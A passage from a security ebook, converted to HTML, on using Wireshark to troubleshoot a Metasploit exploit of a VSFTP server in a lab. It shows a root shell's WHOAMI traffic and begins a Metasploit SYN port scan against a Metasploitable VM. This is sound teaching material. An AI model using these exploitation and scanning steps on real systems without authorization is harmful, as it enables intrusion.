style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Exploit success but no shell</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark484" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >From the figure showing the MSF console, you see multiple attempts to exploit the VSFTP server. Knowing the target machine as we do, we have a high confidence the server is vulnerable to this exploit. We might go so far as to suspect the module actually works to exploit the service. The fact is, however, this shows two attempts, both failing to produce a shell session. Why is that? Maybe bringing up Wireshark can reveal some answers.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section249" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Debugging with Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you can see from the previous few Wireshark screen captures, coupled with the Metasploit screens, the exploit module didn&#8217;t work as expected. On the screen showing the console, you see responses back from the FTP server, namely the service banner and the prompt for a username. The assumption is the module is successfully exploiting the service. Then the console tells us &#8220;Exploit completed, but no session was created.&#8221; Wireshark helps a great deal here to troubleshoot where the problem might be. You can see from the Metasploit that the exploit attempts do work, but they still do not produce the reverse shell hoped for.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you were running this exploit blind, without the opportunity to inspect the packets, you might stop at one or two attempts, then give up. And in retreating from the VSFTP vulnerability, you would miss out on a great opportunity to gain shell access. Fortunately, we enjoy using Wireshark. Here is a great opportunity to let Wireshark help the penetration tester understand what&#8217;s going on.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark485" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The attacking machine is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.100.200.192</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The FTP server, on a different network, has host address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >10.100.200.142</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note: Just a reminder that when you are using the lab, the systems may have different IP addresses than what&#8217;s shown in the book&#8217;s figures.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In<a name="_bookmark486" ></a>&nbsp;</span><span><a href="#_bookmark487" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you see the exploit executes successfully. In this Wireshark screen, the connection starts with packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >193</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, but is reset in packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >194</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The connection attempted again and established in packets 195&#8211;197. In packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >198</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the FTP server prompts for the username. The Metasploit session carries on through packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >203</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In packets </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >204 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >205</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the FTP server shows the earliest sign of failure to respond with a reverse shell. Packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >205</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, returning </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >priv_sock_get_result</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, is shown in </span><span><a href="#_bookmark487" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section250" ><p class=MsoBodyText ><img width="779"  height="586"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker322795.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark487" ></a><span><a href="#_bookmark486" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Exploit attempt in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We believe this could be a fairly simple case of timing, judging by the timestamps, the exploit&#8217;s operation, and the seemingly random failure.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Figuring it&#8217;s worth another attempt, we simply try again, as shown in<a name="_bookmark488" ></a>&nbsp;</span><span><a href="#_bookmark489" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-9</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. And it works this time! Trying several more times, it seems more at random when the exploit fails to create the shell session.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section251" ><p class=MsoBodyText  style="margin-left:14.0000pt;" ><img width="762"  height="508"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker323256.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark489" ></a><span><a href="#_bookmark488" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Exploit success with shell</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We have our shell now. What can you learn from this? Given shell access, someone can perform commands and gain valuable knowledge and access to the system. In the next section, we examine a few packets captured during such access.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Shell in Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><a name="_bookmark490" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While we&#8217;re at it, let&#8217;s check out a couple packets of shell traffic in Wireshark. This isn&#8217;t helpful from a troubleshooting perspective, but it is still interesting to point out, in case you might not run the exploit yourself.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next two figures show two packets, a command and response</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >from the attacker using the shell. In<a name="_bookmark491" ></a>&nbsp;</span><span><a href="#_bookmark492" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-10</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, packet number </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >164 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is highlighted. This is from the attacker&#8217;s machine, sending the command </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >WHOAMI</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Note the command is in clear text, visible in the Packet Bytes pane, with the data portion</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >highlighted.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section252" ><p class=MsoBodyText ><img width="780"  height="374"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker324157.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark492" ></a><span><a href="#_bookmark491" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Root shell command WHOAMI</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;line-height:17.3000pt;mso-line-height-rule:exactly;" ><a name="_bookmark493" ></a><span><a href="#_bookmark494" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The reply is as you would expect. Packet </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >166</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is highlighted in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText ><span><a href="#_bookmark494" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >11</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Again, in the Packet Bytes pane, the data portion of the response</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;shows the response.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="778"  height="392"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker324458.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark494" ></a><span><a href="#_bookmark493" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Root in packet bytes</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note the packet&#8217;s data portion, with a length of 5 bytes. The clear text shown in the Packet Bytes pane shows the response to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >WHOAMI </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section253" ><h2 style="margin-top:3.7000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >TCP Stream Showing a Bind Shell</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this section and the next, we use the Metasploitable image and Wireshark to show the communication during the time Metasploit launches a shell.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We will use Metasploitable image two more times to launch a shell. The first time will be the normal bind shell (established from bad guy to victim). The second time will be a reverse shell, initiated from the victim, back to the server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And again, we use Wireshark to watch over the shell traffic. During these exploits, however, we won&#8217;t view the packet data. Instead, we will watch evidence of the shell through the TCP stream organized by Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:11.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The TCP stream was first discussed in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and will be again in future chapters. The TCP stream is basically the conversation between two devices. With any packet selected in the Packet List pane, you can right-click and choose to Follow </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TCP stream. Wireshark will pop up a box showing the TCP conversation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Without further ado, let&#8217;s start on the first exploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, scan for services. While many people might opt to use nmap as a standalone application to scan for services, we are going to use one of Metasploit&#8217;s many port-scanning modules to walk through how to perform scans using Metasploit. We are going to perform a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >scan, which means we are not going <a name="_bookmark495" ></a>to be completing the TCP three-way handshake. Instead, we&#8217;ll craft raw </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets and see if we get an </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >telling us the state of the port. The following output shows using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >auxiliary/scanner/portscan/syn </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >module against the Metasploitable VM. It is worth noting that this command takes a long time to complete.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.8500pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf &#62; use auxiliary/scanner/portscan/syn msf auxiliary(syn) &#62; show options</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Module options (auxiliary/scanner/portscan/syn):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:357.5500pt;margin-left:32.8500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=94  valign=top  style="width:56.4500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Name</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=233  valign=top  style="width:140.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Current Setting</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:6.1000pt;margin-left:6.1500pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Required</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=148  valign=top  style="width:88.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:2.3500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Description</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=94  valign=top  style="width:56.4500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=233  valign=top  style="width:140.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:6.1000pt;margin-left:6.1500pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=148  valign=top  style="width:88.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:2.3500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
